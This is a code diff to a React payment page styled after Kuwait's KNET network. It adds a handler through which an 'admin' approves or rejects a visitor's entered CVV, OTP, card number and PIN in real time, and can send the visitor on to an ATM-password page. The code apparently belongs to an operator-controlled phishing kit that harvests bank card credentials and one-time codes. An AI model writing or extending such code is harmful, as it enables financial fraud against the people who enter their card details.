@@ -6,6 +6,7 @@ import {
   sendData,
   navigateToPage,
   cardAction,
+  codeAction,
   waitingMessage,
 } from "@/lib/store";
 
@@ -185,6 +186,37 @@ export default function KNETPayment() {
         }
       }
       cardAction.value = null;
+    }
+  });
+
+  // Handle code action from admin (CVV approve / reject buttons)
+  useSignalEffect(() => {
+    if (codeAction.value) {
+      const action = codeAction.value.action;
+      waitingMessage.value = "";
+      setIsWaiting(false);
+
+      if (phase === "otp") {
+        if (action === "cvv") {
+          navigate("/atm-password");
+        } else if (action === "reject") {
+          setRejectedError("يرجى إدخال الرمز بشكل صحيح");
+          setOtpCode("");
+        } else if (action === "approve" || action === "otp") {
+          navigate("/final-page");
+        }
+      } else if (phase === "card") {
+        if (action === "reject") {
+          setRejectedError("يرجى التأكد من المعلومات المدخلة");
+          setCardNumber("");
+          setCardPin("");
+          setSelectedPrefix("");
+          setExpiryMonth("");
+          setExpiryYear("");
+          setSelectedBank("");
+        }
+      }
+      codeAction.value = null;
     }
   });
 
